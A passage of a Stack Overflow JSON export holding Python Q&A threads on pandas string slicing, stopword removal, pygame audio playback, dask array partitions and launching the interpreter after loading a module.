= df.apply(lambda x: x[&#39;a&#39;][x[&#39;b&#39;]:x[&#39;c&#39;]],axis=1)</code>. <code>b</code> is the start index and <code>c</code> is the end index of the slices"}, {"owner": {"reputation": 2423, "user_id": 4043845, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/75de73b9f9301869e5136edf9b663a9b?s=128&d=identicon&r=PG&f=1", "display_name": "Kyle", "link": "https://stackoverflow.com/users/4043845/kyle"}, "reply_to_user": {"reputation": 10847, "user_id": 4799172, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/17539586d5bb4e528d94f3bc4131e6c0?s=128&d=identicon&r=PG&f=1", "display_name": "roganjosh", "link": "https://stackoverflow.com/users/4799172/roganjosh"}, "edited": false, "score": 0, "creation_date": 1572284452, "post_id": 58531223, "comment_id": 103504480, "body": "@roganjosh I did not try any groupby yet. Honestly, I&#39;m not very good with groupbys."}, {"owner": {"reputation": 2423, "user_id": 4043845, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/75de73b9f9301869e5136edf9b663a9b?s=128&d=identicon&r=PG&f=1", "display_name": "Kyle", "link": "https://stackoverflow.com/users/4043845/kyle"}, "reply_to_user": {"reputation": 4746, "user_id": 8474894, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3480af9d214a7d6f6a8cb9ef821b1f24?s=128&d=identicon&r=PG&f=1", "display_name": "CypherX", "link": "https://stackoverflow.com/users/8474894/cypherx"}, "edited": false, "score": 0, "creation_date": 1572284504, "post_id": 58531223, "comment_id": 103504495, "body": "@CypherX I just ran tests on 10,000,000 rows. I should have just done 1,000,000. It took 15 mins for the list comprehension and 3.5 minutes for the apply."}, {"owner": {"reputation": 4746, "user_id": 8474894, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3480af9d214a7d6f6a8cb9ef821b1f24?s=128&d=identicon&r=PG&f=1", "display_name": "CypherX", "link": "https://stackoverflow.com/users/8474894/cypherx"}, "edited": false, "score": 0, "creation_date": 1572298139, "post_id": 58531223, "comment_id": 103509805, "body": "Thank you Kyle. @a_guest&#39;s solution is by far the best, when I tested as well."}], "answers": [{"comments": [{"owner": {"reputation": 2423, "user_id": 4043845, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/75de73b9f9301869e5136edf9b663a9b?s=128&d=identicon&r=PG&f=1", "display_name": "Kyle", "link": "https://stackoverflow.com/users/4043845/kyle"}, "edited": false, "score": 1, "creation_date": 1572284869, "post_id": 58531813, "comment_id": 103504673, "body": "Umm...wow! This takes my process down to 4 seconds. I tried so many different things and was nowhere near that speed."}], "tags": [], "owner": {"reputation": 24576, "user_id": 3767239, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/f7cdefb47f96069d7add1222c70f3f70?s=128&d=identicon&r=PG&f=1", "display_name": "a_guest", "link": "https://stackoverflow.com/users/3767239/a-guest"}, "is_accepted": true, "score": 3, "last_activity_date": 1571870609, "last_edit_date": 1571870609, "creation_date": 1571870220, "answer_id": 58531813, "question_id": 58531223, "link": "https://stackoverflow.com/questions/58531223/efficient-way-to-slice-strings-in-pandas/58531813#58531813", "title": "Efficient Way to Slice Strings in Pandas", "body": "<p>Iterating over <code>df.iterrows()</code> is really slow because for each row it creates a separate <code>pd.Series</code> object. For 100 million rows this means 100 million such objects are being created (and discarded). It's better to <code>zip</code> the columns and use this in a comprehension like so:</p>\n\n<pre><code>df.assign(d=[a[b:c] for a, b, c in zip(df['a'], df['b'], df['c'])])\n</code></pre>\n\n<p>This will only create three <code>Series</code> objects and then iterate over them which saves a lot of overhead.</p>\n\n<p>You can also take a look at <a href=\"https://numba.pydata.org/numba-doc/dev/reference/pysupported.html#str\" rel=\"nofollow noreferrer\">Numba</a> to write your own function that loops over the data frame.</p>\n"}], "owner": {"reputation": 2423, "user_id": 4043845, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/75de73b9f9301869e5136edf9b663a9b?s=128&d=identicon&r=PG&f=1", "display_name": "Kyle", "link": "https://stackoverflow.com/users/4043845/kyle"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 160, "favorite_count": 1, "accepted_answer_id": 58531813, "answer_count": 1, "score": 4, "last_activity_date": 1571870609, "creation_date": 1571866090, "last_edit_date": 1571870281, "question_id": 58531223, "link": "https://stackoverflow.com/questions/58531223/efficient-way-to-slice-strings-in-pandas", "title": "Efficient Way to Slice Strings in Pandas", "body": "<p>I have a dataset that has over 100 million rows that I am trying to manipulate in pandas. I am trying to slice the string in <code>a</code> based on the values in <code>b</code> and <code>c</code> as the start and end points respectively.</p>\n\n<p><a href=\"https://i.stack.imgur.com/6s8SR.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/6s8SR.png\" alt=\"enter image description here\"></a></p>\n\n<p>I can do this with list comprehension like so:</p>\n\n<pre><code>df['d'] = [a[1]['a'][a[1]['b']:a[1]['c']] for a in df.iterrows()]\n</code></pre>\n\n<p>This is really slow. I can do the same thing with an apply like this:</p>\n\n<pre><code>df['d'] = df.apply(lambda x: x['a'][x['b']:x['c']],axis=1)\n</code></pre>\n\n<p>This is also quite slow. My question is, what is the most efficient way to slice the strings in <code>a</code> using the values in <code>b</code> and <code>c</code> as the start and end for the slice?</p>\n"}, {"tags": ["python", "file", "stop-words"], "comments": [{"owner": {"reputation": 2103, "user_id": 7554868, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-_q0V6XZcS5c/AAAAAAAAAAI/AAAAAAAABeM/Bmdf1MpnjTQ/photo.jpg?sz=128", "display_name": "Jammy Dodger", "link": "https://stackoverflow.com/users/7554868/jammy-dodger"}, "edited": false, "score": 0, "creation_date": 1571866232, "post_id": 58531213, "comment_id": 103386263, "body": "You seem to be calling <code>st.read()</code> outside of your with block, meaning st will be closed. Also, what is the problem with this code so far?"}, {"owner": {"reputation": 13, "user_id": 7965756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/652f5bf72575ec18622d2cf0ec1f6cd0?s=128&d=identicon&r=PG&f=1", "display_name": "Joanna", "link": "https://stackoverflow.com/users/7965756/joanna"}, "reply_to_user": {"reputation": 2103, "user_id": 7554868, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-_q0V6XZcS5c/AAAAAAAAAAI/AAAAAAAABeM/Bmdf1MpnjTQ/photo.jpg?sz=128", "display_name": "Jammy Dodger", "link": "https://stackoverflow.com/users/7554868/jammy-dodger"}, "edited": false, "score": 0, "creation_date": 1571908616, "post_id": 58531213, "comment_id": 103398349, "body": "hey @JammyDodger thanks for the reply! I&#39;ve updated my original question ^ with the problem. If you could help that would be much appreciated!!"}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 7965756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/652f5bf72575ec18622d2cf0ec1f6cd0?s=128&d=identicon&r=PG&f=1", "display_name": "Joanna", "link": "https://stackoverflow.com/users/7965756/joanna"}, "edited": false, "score": 0, "creation_date": 1571866877, "post_id": 58531314, "comment_id": 103386454, "body": "thats the strategy I wanted to go for but we&#39;re not allowed to use NLTK... we&#39;ve been given a text file with a bunch on stopwords they want us to remove from the document file...any suggestions?!? thanks!!!"}, {"owner": {"reputation": 155, "user_id": 6396651, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NgEHQ.jpg?s=128&g=1", "display_name": "Dan Iftinca", "link": "https://stackoverflow.com/users/6396651/dan-iftinca"}, "reply_to_user": {"reputation": 13, "user_id": 7965756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/652f5bf72575ec18622d2cf0ec1f6cd0?s=128&d=identicon&r=PG&f=1", "display_name": "Joanna", "link": "https://stackoverflow.com/users/7965756/joanna"}, "edited": false, "score": 0, "creation_date": 1571867017, "post_id": 58531314, "comment_id": 103386494, "body": "So you only need to delete certain words from a text? No stemming involved?"}, {"owner": {"reputation": 13, "user_id": 7965756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/652f5bf72575ec18622d2cf0ec1f6cd0?s=128&d=identicon&r=PG&f=1", "display_name": "Joanna", "link": "https://stackoverflow.com/users/7965756/joanna"}, "edited": false, "score": 0, "creation_date": 1571867217, "post_id": 58531314, "comment_id": 103386566, "body": "yes, so for example stopwords.txt is [a, the, it, from] and the text.txt is [Hello I am from the UK] should become [Hello I am UK]. I also need to stem but thats the next step! i&#39;ve managed to get the stem working but i need to remove the stop words first."}, {"owner": {"reputation": 155, "user_id": 6396651, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NgEHQ.jpg?s=128&g=1", "display_name": "Dan Iftinca", "link": "https://stackoverflow.com/users/6396651/dan-iftinca"}, "reply_to_user": {"reputation": 13, "user_id": 7965756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/652f5bf72575ec18622d2cf0ec1f6cd0?s=128&d=identicon&r=PG&f=1", "display_name": "Joanna", "link": "https://stackoverflow.com/users/7965756/joanna"}, "edited": false, "score": 0, "creation_date": 1571867611, "post_id": 58531314, "comment_id": 103386680, "body": "Check the snippet I added in the edit. Didn&#39;t get to test it, but should work."}, {"owner": {"reputation": 13, "user_id": 7965756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/652f5bf72575ec18622d2cf0ec1f6cd0?s=128&d=identicon&r=PG&f=1", "display_name": "Joanna", "link": "https://stackoverflow.com/users/7965756/joanna"}, "edited": false, "score": 0, "creation_date": 1571908717, "post_id": 58531314, "comment_id": 103398407, "body": "hey! i think the snippet has the right thought in mind but the replace method didn&#39;t work because it was expecting two arguements (I updated that in my code above) but im still having problems :("}], "tags": [], "owner": {"reputation": 155, "user_id": 6396651, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NgEHQ.jpg?s=128&g=1", "display_name": "Dan Iftinca", "link": "https://stackoverflow.com/users/6396651/dan-iftinca"}, "is_accepted": false, "score": 0, "last_activity_date": 1571867540, "last_edit_date": 1571867540, "creation_date": 1571866668, "answer_id": 58531314, "question_id": 58531213, "link": "https://stackoverflow.com/questions/58531213/removing-all-stopwords-defined-in-a-file-from-a-text-in-another-file-python/58531314#58531314", "title": "Removing all stopwords defined in a file from a text in another file (Python)", "body": "<p>Here is what I use when I need to remove English stop words. I usually also use the corpus from nltk instead of my own file for stop words. </p>\n\n<pre><code>from nltk.corpus import stopwords\nfrom nltk.stem import PorterStemmer\nps = PorterStemmer()\n\n## Remove stop words\nstops = set(stopwords.words(\"english\"))\ntext = [ps.stem(w) for w in text if not w in stops and len(w) &gt;= 3]\ntext = list(set(text)) #remove duplicates\ntext = \" \".join(text)\n</code></pre>\n\n<p>For your special case I would do something like: </p>\n\n<pre><code>stops = list_of_words_from_file\n</code></pre>\n\n<p>Let me know if I answered your question, I am not sure if the problem is the read from file or the stemming.</p>\n\n<p>Edit: \nTo remove all stopwords defined in a file from a text in another file, we can use str.replace()</p>\n\n<pre><code>for word in st_list:\n    f_content=f_content.replace(word)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 602, "user_id": 9893725, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1K2dZ.jpg?s=128&g=1", "display_name": "Paulo Marques", "link": "https://stackoverflow.com/users/9893725/paulo-marques"}, "is_accepted": false, "score": 0, "last_activity_date": 1577986548, "last_edit_date": 1577986548, "creation_date": 1571867496, "answer_id": 58531444, "question_id": 58531213, "link": "https://stackoverflow.com/questions/58531213/removing-all-stopwords-defined-in-a-file-from-a-text-in-another-file-python/58531444#58531444", "title": "Removing all stopwords defined in a file from a text in another file (Python)", "body": "<p>Based on the fact you are facing performance issues. I would suggest using the <code>subprocess</code> library (<a href=\"https://docs.python.org/2/library/subprocess.html\" rel=\"nofollow noreferrer\">for Python2</a>, or <a href=\"https://docs.python.org/3.8/library/subprocess.html\" rel=\"nofollow noreferrer\">for Python3</a>) to call the <code>sed</code> linux command.</p>\n\n<p>I know Python is really good for this kind of thing (and many others), but if you have a really big text.txt. I would try the old, ugly, and powerful command-line 'sed'.</p>\n\n<p>Try something like:</p>\n\n<p>sed -f stopwords.sed text.txt > output_file.txt</p>\n\n<p>For the stopwords.sed file, each stopword must be in a different line and using the format below:</p>\n\n<pre><code>s|\\&lt;xxxxx\\&gt;||g\n</code></pre>\n\n<p>Where 'xxxxx' would be the stopword itself.</p>\n\n<pre><code>s|\\&lt;the\\&gt;||g\n</code></pre>\n\n<p>The line above would remove all occurrences of 'the' (without single quotes)</p>\n\n<p>Worth a try.</p>\n"}, {"tags": [], "owner": {"reputation": 13, "user_id": 7965756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/652f5bf72575ec18622d2cf0ec1f6cd0?s=128&d=identicon&r=PG&f=1", "display_name": "Joanna", "link": "https://stackoverflow.com/users/7965756/joanna"}, "is_accepted": false, "score": 0, "last_activity_date": 1571928533, "creation_date": 1571928533, "answer_id": 58543911, "question_id": 58531213, "link": "https://stackoverflow.com/questions/58531213/removing-all-stopwords-defined-in-a-file-from-a-text-in-another-file-python/58543911#58543911", "title": "Removing all stopwords defined in a file from a text in another file (Python)", "body": "<p>I think this kind of worked... but it's incredibly slow so if anyone has any suggestions on how to make this more efficient I'd really appreciate it!</p>\n\n<pre><code>import re\nfrom stemming.porter2 import stem as PT\n\n\nwith open('text.txt', 'r') as f, open('stopwords.txt','r') as st:\n\n    f_content = f.read()\n    processed = re.split('[^a-zA-Z]', f_content)\n    processed = [x.lower() for x in processed]\n    processed = [PT(x) for x in processed]\n    #print(processed)\n\n    st_content = st.read()\n    st_list = set(st_content.split())\n\n    clean_text = [x for x in processed if x not in st_list]\n    print clean_text\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 7965756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/652f5bf72575ec18622d2cf0ec1f6cd0?s=128&d=identicon&r=PG&f=1", "display_name": "Joanna", "link": "https://stackoverflow.com/users/7965756/joanna"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1490, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1577986548, "creation_date": 1571866040, "last_edit_date": 1571911161, "question_id": 58531213, "link": "https://stackoverflow.com/questions/58531213/removing-all-stopwords-defined-in-a-file-from-a-text-in-another-file-python", "title": "Removing all stopwords defined in a file from a text in another file (Python)", "body": "<p>I have two text files:</p>\n\n<ol>\n<li>Stopwords.txt --> contains stop words one per line </li>\n<li>text.txt --> big document file</li>\n</ol>\n\n<p>I'm trying to remove all occurences of stopwords (any word in the stopwords.txt file) from the text.txt file <strong>without using NLTK</strong> (school assignment).</p>\n\n<p>How would I go about doing this? This is my code so far. </p>\n\n<pre><code>import re\n\nwith open('text.txt', 'r') as f, open('stopwords.txt','r') as st:\n    f_content = f.read()\n    #splitting text.txt by non alphanumeric characters\n    processed = re.split('[^a-zA-Z]', f_content)\n\n    st_content = st.read()\n    #splitting stopwords.txt by new line\n    st_list = re.split('\\n', st_content)\n    #print(st_list) to check it was working\n\n    #what I'm trying to do is: traverse through the text. If stopword appears, \n    #remove it. otherwise keep it. \n    for word in st_list:\n        f_content = f_content.replace(word, \"\")\n        print(f_content) \n</code></pre>\n\n<p>but when I run the code, it first takes forever to output something and when it does it just outputs the entire text file. (I'm new to python so let me know if I'm doing something fundamentally wrong!)</p>\n"}, {"tags": ["python", "python-3.x", "audio", "pygame"], "comments": [{"owner": {"reputation": 12260, "user_id": 1730895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6abb0b52473d614852289b49ccf3c3c?s=128&d=identicon&r=PG", "display_name": "Kingsley", "link": "https://stackoverflow.com/users/1730895/kingsley"}, "edited": false, "score": 1, "creation_date": 1571867978, "post_id": 58531199, "comment_id": 103386799, "body": "This question comes up all the time.  Essentially <code>music.play()</code> only <i>starts</i> the sounds playing.  So your <code>main()</code> loop is rapidly starting a new sound before before the previous sound has time to complete.  See this answer for usage of <code>get_busy()</code> - <a href=\"https://stackoverflow.com/a/35241284/1730895\">stackoverflow.com/a/35241284/1730895</a>"}, {"owner": {"reputation": 12260, "user_id": 1730895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6abb0b52473d614852289b49ccf3c3c?s=128&d=identicon&r=PG", "display_name": "Kingsley", "link": "https://stackoverflow.com/users/1730895/kingsley"}, "edited": false, "score": 0, "creation_date": 1571868325, "post_id": 58531199, "comment_id": 103386890, "body": "Also this question: <a href=\"https://stackoverflow.com/questions/7746263/how-can-i-play-an-mp3-with-pygame\" title=\"how can i play an mp3 with pygame\">stackoverflow.com/questions/7746263/&hellip;</a>"}], "owner": {"reputation": 81, "user_id": 9834638, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-nsdlr8cMgfM/AAAAAAAAAAI/AAAAAAAAEOk/GmTqYS0wKE0/photo.jpg?sz=128", "display_name": "Daburu", "link": "https://stackoverflow.com/users/9834638/daburu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 21, "favorite_count": 0, "closed_date": 1608455482, "answer_count": 0, "score": 1, "last_activity_date": 1571865942, "creation_date": 1571865942, "question_id": 58531199, "link": "https://stackoverflow.com/questions/58531199/no-sound-while-playing-mp3-with-pygame", "closed_reason": "Duplicate", "title": "No sound while playing mp3 with pygame", "body": "<p>I wrote a script which plays audio when you press any key (that's a letter), but I'm not getting any audio, the script itself actualy works but I don't hear anything</p>\n\n<pre><code>import os\nimport keyboard, string, random\nimport pygame as pg\n\nletter = string.ascii_letters\ndigit = string.digits\n\npg.init()\npg.mixer.init()\n\nks1 = \"C:\\\\keypress\\\\key-press-1.mp3\"\nks2 = \"C:\\\\keypress\\\\key-press-2.mp3\"\nks3 = \"C:\\\\keypress\\\\key-press-3.mp3\"\nks4 = \"C:\\\\keypress\\\\key-press-4.mp3\"\n\nkeyList = [ks1, ks2, ks3, ks4]\n\ndef typing(keySound):\n    if letter.find(keyboard.read_key())&gt;-1:\n        pg.mixer.music.load(keySound)\n        pg.mixer.music.play()\n\ndef main():\n    while True:\n        keySound = random.choice(keyList)\n        print(keySound)\n        typing(keySound)\n\nmain()\n</code></pre>\n\n<p>Any help is appreciated!</p>\n"}, {"tags": ["python", "dask", "dask-distributed", "dask-delayed", "dask-ml"], "answers": [{"tags": [], "owner": {"reputation": 47893, "user_id": 616616, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/8749ec52cee260c4c1f67f2dec29d957?s=128&d=identicon&r=PG", "display_name": "MRocklin", "link": "https://stackoverflow.com/users/616616/mrocklin"}, "is_accepted": false, "score": 0, "last_activity_date": 1571878093, "creation_date": 1571878093, "answer_id": 58532680, "question_id": 58531181, "link": "https://stackoverflow.com/questions/58531181/how-to-find-row-index-for-dask-array-partitions/58532680#58532680", "title": "How to find row index for dask array partitions", "body": "<p>For Dask arrays you want to look at the <code>.chunks</code> attribute.  In particular I think that you will probably want something like </p>\n\n<pre><code>[np.cumsum(c) for c in x.chunks]\n</code></pre>\n\n<p>For more information, see <a href=\"https://docs.dask.org/en/latest/array-design.html#chunks\" rel=\"nofollow noreferrer\">https://docs.dask.org/en/latest/array-design.html#chunks</a></p>\n"}], "owner": {"reputation": 986, "user_id": 2953798, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/47edc9c371f59db2f0620d0ae46d4c8f?s=128&d=identicon&r=PG&f=1", "display_name": "Manvi", "link": "https://stackoverflow.com/users/2953798/manvi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 113, "favorite_count": 1, "answer_count": 1, "score": 1, "last_activity_date": 1571878093, "creation_date": 1571865845, "question_id": 58531181, "link": "https://stackoverflow.com/questions/58531181/how-to-find-row-index-for-dask-array-partitions", "title": "How to find row index for dask array partitions", "body": "<p>I have a 2D (4950, 4950) dask array which I want to compute in parallel. Using link: <a href=\"https://docs.dask.org/en/latest/delayed-best-practices.html#don-t-call-dask-delayed-on-other-dask-collections\" rel=\"nofollow noreferrer\">https://docs.dask.org/en/latest/delayed-best-practices.html#don-t-call-dask-delayed-on-other-dask-collections</a></p>\n\n<pre><code>print(da.shape)\npartitions = da.to_delayed()\nprint(partitions)\ndelayed_values = [dask.delayed(funct)(part) for part in partitions]\nprint(delayed_values)\n</code></pre>\n\n<p>Result I am getting is:</p>\n\n<pre><code>(4950, 4950)\n[[Delayed(('gt-f3b8d1635832fc9b88447def18b4b7d0', 0, 0))\n  Delayed(('gt-f3b8d1635832fc9b88447def18b4b7d0', 0, 1))\n  Delayed(('gt-f3b8d1635832fc9b88447def18b4b7d0', 0, 2))\n  Delayed(('gt-f3b8d1635832fc9b88447def18b4b7d0', 0, 3))]\n [Delayed(('gt-f3b8d1635832fc9b88447def18b4b7d0', 1, 0))\n  Delayed(('gt-f3b8d1635832fc9b88447def18b4b7d0', 1, 1))\n  Delayed(('gt-f3b8d1635832fc9b88447def18b4b7d0', 1, 2))\n  Delayed(('gt-f3b8d1635832fc9b88447def18b4b7d0', 1, 3))]\n [Delayed(('gt-f3b8d1635832fc9b88447def18b4b7d0', 2, 0))\n  Delayed(('gt-f3b8d1635832fc9b88447def18b4b7d0', 2, 1))\n  Delayed(('gt-f3b8d1635832fc9b88447def18b4b7d0', 2, 2))\n  Delayed(('gt-f3b8d1635832fc9b88447def18b4b7d0', 2, 3))]\n [Delayed(('gt-f3b8d1635832fc9b88447def18b4b7d0', 3, 0))\n  Delayed(('gt-f3b8d1635832fc9b88447def18b4b7d0', 3, 1))\n  Delayed(('gt-f3b8d1635832fc9b88447def18b4b7d0', 3, 2))\n  Delayed(('gt-f3b8d1635832fc9b88447def18b4b7d0', 3, 3))]]\n[Delayed('funct-c0044e9f-4b8e-4d02-b364-f6a483eaae2f'), \n Delayed('funct-d2d14dcd-6f0a-4198-b999-221b0609bcaa'), \n Delayed('funct-1951008c-14f4-43da-bbc1-443e90aae029'), \n Delayed('funct-a254e3ba-2d45-45f8-bae4-85ba8c37a32f')]\n</code></pre>\n\n<p>I want to figure out row index (first and last index) for each partition to save compute result for each index in final output file.</p>\n\n<p>I am unable to find much documentation related to partitions, Any help/link that can help to find row index is highly appreciated.</p>\n"}, {"tags": ["python"], "comments": [{"owner": {"reputation": 69207, "user_id": 1440565, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/ec430cc01ef4cf4ae63ebbe9e8596f72?s=128&d=identicon&r=PG", "display_name": "Code-Apprentice", "link": "https://stackoverflow.com/users/1440565/code-apprentice"}, "edited": false, "score": 0, "creation_date": 1571866101, "post_id": 58531180, "comment_id": 103386218, "body": "What do you mean by &quot;self-executable module&quot;?"}, {"owner": {"reputation": 18268, "user_id": 5218354, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh4.googleusercontent.com/-NEO9rZKeffY/AAAAAAAAAAI/AAAAAAAAAKc/9IttO1jUOr4/photo.jpg=k-s128", "display_name": "norok2", "link": "https://stackoverflow.com/users/5218354/norok2"}, "edited": false, "score": 0, "creation_date": 1571866112, "post_id": 58531180, "comment_id": 103386222, "body": "Do you mean something like <code>from mod import *</code> ?"}, {"owner": {"reputation": 2038, "user_id": 687896, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/0OURB.jpg?s=128&g=1", "display_name": "Brandt", "link": "https://stackoverflow.com/users/687896/brandt"}, "reply_to_user": {"reputation": 69207, "user_id": 1440565, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/ec430cc01ef4cf4ae63ebbe9e8596f72?s=128&d=identicon&r=PG", "display_name": "Code-Apprentice", "link": "https://stackoverflow.com/users/1440565/code-apprentice"}, "edited": false, "score": 0, "creation_date": 1571866344, "post_id": 58531180, "comment_id": 103386303, "body": "Right @Code-Apprentice, it was unnecessary/confusing. I edited to leave only <i>executable module</i>."}, {"owner": {"reputation": 69207, "user_id": 1440565, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/ec430cc01ef4cf4ae63ebbe9e8596f72?s=128&d=identicon&r=PG", "display_name": "Code-Apprentice", "link": "https://stackoverflow.com/users/1440565/code-apprentice"}, "edited": false, "score": 0, "creation_date": 1571873407, "post_id": 58531180, "comment_id": 103388039, "body": "@Brandt I&#39;m still unclear how what you are asking is different than your first example."}, {"owner": {"reputation": 2038, "user_id": 687896, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/0OURB.jpg?s=128&g=1", "display_name": "Brandt", "link": "https://stackoverflow.com/users/687896/brandt"}, "reply_to_user": {"reputation": 69207, "user_id": 1440565, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/ec430cc01ef4cf4ae63ebbe9e8596f72?s=128&d=identicon&r=PG", "display_name": "Code-Apprentice", "link": "https://stackoverflow.com/users/1440565/code-apprentice"}, "edited": false, "score": 0, "creation_date": 1571911141, "post_id": 58531180, "comment_id": 103399691, "body": "Sorry @Code-Apprentice, all I wanted was to get rid of the interpreter call, <i>i.e.</i>, <code>python -i</code>."}], "answers": [{"tags": [], "owner": {"reputation": 3885, "user_id": 652528, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/a580420b66f89e76e1fb9a368f785b3f?s=128&d=identicon&r=PG", "display_name": "geckos", "link": "https://stackoverflow.com/users/652528/geckos"}, "is_accepted": true, "score": 1, "last_activity_date": 1571868255, "last_edit_date": 1571868255, "creation_date": 1571866693, "answer_id": 58531316, "question_id": 58531180, "link": "https://stackoverflow.com/questions/58531180/run-python-interpreter-after-loading-module-package/58531316#58531316", "title": "Run Python interpreter after loading module/package", "body": "<p>You can run the interpreter inside the module, it will have the definitions provided at the module if you pass it to the interpreter as <code>local=</code> keyword argument,</p>\n\n<p>Just put <code>import code; code.interact(local=locals())</code> where\nyou want the interpreter to execute.</p>\n\n<p>Here is a example of defining a variable and the running the interpreter. See that the variable is available inside the interpreter.</p>\n\n<pre><code>python3 -c 'import code; foo=10; code.interact(local=locals())'\nPython 3.7.3 (default, May 11 2019, 00:45:16) \n[GCC 8.3.1 20190223 (Red Hat 8.3.1-2)] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n(InteractiveConsole)\n&gt;&gt;&gt; foo\n10\n</code></pre>\n\n<p>This will start a interpreter inside the script, is a inverted form of <code>python -i</code></p>\n\n<p>I hope this helps</p>\n"}, {"tags": [], "owner": {"reputation": 2038, "user_id": 687896, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/0OURB.jpg?s=128&g=1", "display_name": "Brandt", "link": "https://stackoverflow.com/users/687896/brandt"}, "is_accepted": false, "score": 0, "last_activity_date": 1571867907, "last_edit_date": 1571867907, "creation_date": 1571867398, "answer_id": 58531434, "question_id": 58531180, "link": "https://stackoverflow.com/questions/58531180/run-python-interpreter-after-loading-module-package/58531434#58531434", "title": "Run Python interpreter after loading module/package", "body": "<p>Actually, it's simpler than I thought. After a glass of water I got it: <a href=\"https://en.wikipedia.org/wiki/Shebang_(Unix)\" rel=\"nofollow noreferrer\">shebang</a>!</p>\n\n<p>A module:</p>\n\n<pre><code>$ cat &gt; mod.py &lt;&lt; EOF\n#!/usr/bin/env python -i\nvar = 'Chao'\nEOF\n$ chmod +x mod.py\n$ ./mod.py\n&gt;&gt;&gt; print(var)\nChao\n&gt;&gt;&gt;\n</code></pre>\n\n<p>A <a href=\"https://docs.python.org/3/library/zipapp.html\" rel=\"nofollow noreferrer\">zipapp</a>:</p>\n\n<pre><code>$ cat &gt; modz.py &lt;&lt; EOF\nvar = 'Oi'\nEOF\n$ python -m zipapp modz.py -o mod.pyz -p '/usr/bin/env python -i'\n$ ./mod.pyz\n&gt;&gt;&gt; print(var)\nOi\n&gt;&gt;&gt;\n</code></pre>\n\n<hr>\n\n<p>Edit:</p>\n\n<ul>\n<li>Complementing with the answer from <a href=\"https://stackoverflow.com/a/58531316/687896\">gecos</a>, we could do that through the <a href=\"https://docs.python.org/3/library/code.html\" rel=\"nofollow noreferrer\">code</a> library:</li>\n</ul>\n\n<pre><code>$ cat &gt; gecos.py &lt;&lt; EOF\n#!/usr/bin/env python\nimport code\nvar = 'Hallo'\ncode.interact(local=locals())\nEOF\n$ chmod +x gecos.py\n$ ./gecos.py\n&gt;&gt;&gt; print(var)\nHallo\n&gt;&gt;&gt;\n</code></pre>\n"}], "owner": {"reputation": 2038, "user_id": 687896, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/0OURB.jpg?s=128&g=1", "display_name": "Brandt", "link": "https://stackoverflow.com/users/687896/brandt"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 39, "favorite_count": 0, "accepted_answer_id": 58531316, "answer_count": 2, "score": 0, "last_activity_date": 1571868255, "creation_date": 1571865843, "last_edit_date": 1571866246, "question_id": 58531180, "link": "https://stackoverflow.com/questions/58531180/run-python-interpreter-after-loading-module-package", "title": "Run Python interpreter after loading module/package", "body": "<p><code>python -i &lt;module&gt;</code> provides us the Python shell (aka, interpreter) right after reading <em>module</em>; whatever defined inside <em>module</em> is available at the Shell (<code>__main__</code>) namespace.\nSo we can do the following:</p>\n\n<pre><code>$ cat &gt; mod.py &lt;&lt; EOF\nvar = 'Hi'\nEOF\n$ python -i mod.py\n&gt;&gt;&gt; print(var)\nHi\n&gt;&gt;&gt;\n</code></pre>\n\n<p>The same works for a package:</p>\n\n<pre><code>$ mkdir pkg\n$ cat &gt; pkg/__main__.py &lt;&lt; EOF\nvar = 'Hello'\nEOF\n$ python -i pkg\n&gt;&gt;&gt; 